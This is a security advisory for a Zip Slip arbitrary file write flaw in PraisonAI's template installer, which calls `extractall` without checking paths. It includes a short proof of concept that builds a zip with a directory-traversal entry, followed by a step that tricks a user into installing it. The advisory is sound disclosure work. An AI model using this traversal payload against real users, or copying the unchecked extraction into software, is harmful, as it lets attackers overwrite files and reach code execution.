summary: "PraisonAI Has Arbitrary File Write (Zip Slip) in Templates Extraction\nThe PraisonAI\
  \ templates installation feature is vulnerable to a \"Zip Slip\" Arbitrary File Write attack.\
  \ When downloading and extracting template archives from external sources (e.g., GitHub),\
  \ the application uses Python's `zipfile.extractall()` without verifying if the files within\
  \ the archive resolve outside of the intended extraction directory. \n\n### Details\nLocation:\
  \ `src/praisonai/praisonai/cli/features/templates.py` (Line 852)\n\nVulnerable Code snippet:\n\
  ```python\nzip_ref.extractall(tmpdir)\n```\n\nDuring installation, the CLI downloads a ZIP\
  \ archive and extracts it directly into a temporary directory using `zip_ref.extractall(tmpdir)`.\
  \ A specially crafted ZIP archive can contain file entries with relative paths (such as `../../../../tmp/evil.sh`).\
  \ If extracting this archive in older Python versions or environments where extraction rules\
  \ aren't strict, `extractall` will write these files outside the target directory, allowing\
  \ an attacker to overwrite arbitrary files on the victim's filesystem.\n\n### PoC\n1. Generate\
  \ a malicious zip payload:\n```python\nimport zipfile\n\nwith zipfile.ZipFile('malicious_template.zip',\
  \ 'w') as z:\n    # Adding a file that traverses directories\n    z.writestr('../../../../../../../tmp/zip_slip_pwned.txt',\
  \ 'pwned by zip slip')\n```\n2. Trick a user into installing the malicious template:\n```bash\n\
  praisonai templates install github:attacker/malicious_template\n```\n3. Observe the `zip_slip_pwned.txt`\
  \ file created in `/tmp/` on the victim's machine.\n\n### Impact\nThis is an Arbitrary File\
  \ Write vulnerability affecting any user who installs community templates. It can be leveraged\
  \ to overwrite system files, user dotfiles, or application code, ultimately leading to system\
  \ corruption or full Remote Code Execution (RCE)."
